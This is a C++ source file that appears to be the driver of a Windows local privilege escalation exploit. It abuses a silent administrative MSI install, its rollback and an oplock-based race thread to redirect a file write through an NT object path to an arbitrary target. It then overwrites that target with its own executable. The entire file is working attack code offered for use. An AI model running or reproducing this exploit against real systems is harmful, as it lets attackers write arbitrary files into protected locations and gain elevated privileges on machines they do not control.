#include <Windows.h>
#include <Msi.h>
#include <Shlwapi.h>
#include <thread>
#include <iostream>
#include <fstream>
#include <filesystem>

#include "popl.hpp"
#include "FileOpLock.h"
#include "exploit.h"

namespace
{
    bool install_msi(const std::string& p_msi_path, const std::string& p_install_path)
    {
        MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);

        std::string properties("ACTION=ADMIN REBOOT=ReallySuppress TARGETDIR=");
        properties.append(p_install_path);
        std::cout << "[+] MSI install: " << properties << " " << p_msi_path << std::endl;
        int result = MsiInstallProductA(p_msi_path.c_str(), properties.c_str());
        std::cout << "[+] MsiInstallProductA return value: " << result << std::endl;
        return (result == 1603);
    }
}

int main(int p_argc, char* p_argv[])
{
    popl::OptionParser op("Allowed options");
    auto help_option = op.add<popl::Switch>("h", "help", "produce help message");
    auto msi_path = op.add<popl::Value<std::string>, popl::Attribute::required>("m", "msi_path", "The path to the MSI to install");
    auto i_path = op.add<popl::Value<std::string>, popl::Attribute::required>("i", "install_path", "The path to install to");
    auto target_path = op.add<popl::Value<std::string>, popl::Attribute::required>("p", "target_path", "The file to create");

    try
    {
        op.parse(p_argc, p_argv);
    }
    catch (std::exception& e)
    {
        std::cout << e.what() << std::endl;
        std::cout << op << std::endl;
        return EXIT_FAILURE;
    }

    if (help_option->is_set())
    {
        std::cout << op << std::endl;
        return EXIT_SUCCESS;
    }

    std::cout << "[+] User provided MSI path: " << msi_path->value() << std::endl;
    std::cout << "[+] The target path is: " << target_path->value() << std::endl;

    std::string adjusted_target("\\??\\");
    adjusted_target.append(target_path->value());
    Exploit exp_obj(msi_path->value(), adjusted_target, i_path->value());
    exp_obj.load_ntdll();
    if (!exp_obj.create_temp_files())
    {
        std::cerr << "[-] Creating the temp files failed" << std::endl;
        return EXIT_FAILURE;
    }

    std::thread doExploit(&Exploit::exploit_thread, &exp_obj);
    
    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    if (!install_msi(msi_path->value(), i_path->value()))
    {
        std::cout << "[-] Install MSI return a bad value" << std::endl;
        return EXIT_SUCCESS;
    }
    doExploit.join();
    std::cout << "[+] Exploit thread joined" << std::endl;
    std::cout << "[+] Copy into target!" << std::endl;

    char current_path[MAX_PATH];
    GetModuleFileNameA(GetModuleHandle(NULL), current_path, MAX_PATH);
    CopyFileA(current_path, target_path->value().c_str(), FALSE);

    return EXIT_SUCCESS;
}
